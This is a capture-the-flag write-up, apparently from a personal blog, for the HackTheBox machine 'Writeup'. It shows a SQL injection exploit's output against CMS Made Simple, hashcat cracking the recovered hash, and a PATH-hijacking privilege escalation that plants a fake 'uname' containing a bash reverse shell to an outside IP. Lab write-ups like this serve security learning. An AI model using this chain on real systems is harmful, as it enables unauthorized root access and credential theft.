---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-06-10-writeup-hackthebox
tags:
- hackthebox
- linux
- path hijacking
- sql injection
title: Writeup @ HackTheBox
---

Writeup is a nice, medium difficulty machine on hackthebox, featuring the use of a publicly available sql injection exploit and a rather unique way to get root by using path poisoning.

## User Flag

We start by doing a tcp port scan on the box and find the following open ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 80 we find a website that is not giving us too much information – when we look at the output of nmap we can however see that robots.txt has an entry for /writeup/ so we go there and get the following website:

![](htb_writeup_index.png)

In the pages source we find a hint about the cms being used `<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />`. We start looking for publicly available exploits and find [CVE-2019-9053](https://www.exploit-db.com/exploits/46635), a recent sql injection vulnerability that allows us to retrieve the hash of the admin password:

```
python solve.py -u http://10.10.10.138/writeup/
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

To crack the hash we use hashcat and quickly recover the password:

```
hashcat64.exe -a0 -m20 -r rules.txt jkr.txt rockyou.txt
...
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```

With these credentials we can log into the box via ssh and grab the user flag.

## Root Flag

Root is a bit tricky on this box. We copy over and run pspy64s and create another ssh session by logging in on another window, which shows the following code being executed:

```
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
```

By checking groups of our user with `id` we notice that we are in the staff group, which is unusual. It turns out that staff can write at "/usr/local/", which means that if we place a binary here that is called on logging in, ours will be called instead of the usual one with root permissions. We write a simple script that can give us a root reverse shell on execution:

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.46/6000 0>&1
```

After compiling it on our box and copying it over to "/usr/local/bin/uname" on the target, we run `chmod +x` to make it executable. We can use uname as a target binary because it is a program that will always be called on logging in. When logging in again we get a root shell.

Many thanks to [jkr](https://www.hackthebox.eu/home/users/profile/77141) for creating this fun box. Root was really challenging for me.